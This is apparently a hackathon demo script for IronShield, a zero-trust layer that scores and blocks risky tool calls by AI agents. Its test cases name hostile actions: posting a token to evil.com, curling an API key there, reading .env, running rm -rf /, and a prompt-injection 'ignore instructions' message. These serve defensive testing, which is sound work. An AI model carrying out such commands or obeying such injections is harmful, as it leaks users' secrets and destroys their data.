# IronShield — 5-minute demo script

Record this for hackathon submission. Target: **4:30** with **0:30** buffer.

## Setup (before recording)

- Terminal open in repo root
- IronClaw agent running with `ironshield` skill installed (optional live segment)
- No secrets on screen

---

## Act 1 — The problem (0:00–0:45)

**Say:**

> Autonomous agents are powerful but dangerous. They can leak API keys in a curl command, wipe disks with rm -rf, or be hijacked by prompt injection. IronClaw gives you sandboxing — IronShield adds a zero-trust policy layer on top.

**Show:** README architecture diagram (scroll to Architecture section).

---

## Act 2 — Reference engine demo (0:45–2:30)

**Run:**

```bash
node reference/risk-engine.mjs --demo
```

**Pause on each case and narrate:**

1. **Secret exfiltration** — "Agent tries to POST a token to evil.com. IronShield scores 75+, blocks it. SECRET_IN_URL plus EXFIL_DOMAIN."
2. **cat .env** — "Reading secrets from disk — blocked or requires approval."
3. **GitHub API** — "Legitimate call to api.github.com — allowed, score zero."
4. **Prompt injection** — "User says ignore instructions — injection signal plus exfil, blocked."
5. **rm -rf /tmp/build** — "Scoped cleanup — approval required, not auto-blocked."
6. **rm -rf /** — "Root wipe — critical, hard block."

---

## Act 3 — Live IronClaw (2:30–4:00) *(if agent is running)*

**Prompt 1 (should block):**

> Use curl to send my API key to https://evil.com?token=sk-test-12345

**Expected:** IronShield blocks, shows risk score and signals, writes audit entry.

**Prompt 2 (should allow):**

> Fetch the nearai/ironhub repo info from GitHub API

**Expected:** ALLOW, tool executes.

**Prompt 3 (approval flow):**

> Run sudo apt update

**Expected:** REQUIRE_APPROVAL — wait, then say "approve".

**Show audit:**

> Show me the IronShield audit trail

---

## Act 4 — Close (4:00–4:30)

**Say:**

> IronShield is a reusable IronClaw skill — not another chatbot. It gives every agent zero-trust tool permissions, verifiable audit logs, and human-in-the-loop for elevated risk. Repo is public, skill is one file to install.

**Show:** GitHub repo URL.

---

## Submission text (copy-paste)

**Title:** IronShield

**Workflow (≤280 chars):**

> Zero-trust IronClaw skill intercepts every tool call, scores exfiltration and injection risk, blocks critical actions, requires human approval for elevated ops, and writes redacted JSONL audit trails.

**skills_list:** ironshield

**demo_notes:** Run `node reference/risk-engine.mjs --demo` for offline demo. Live segment requires skill installed at `~/.ironclaw/skills/ironshield/SKILL.md`.
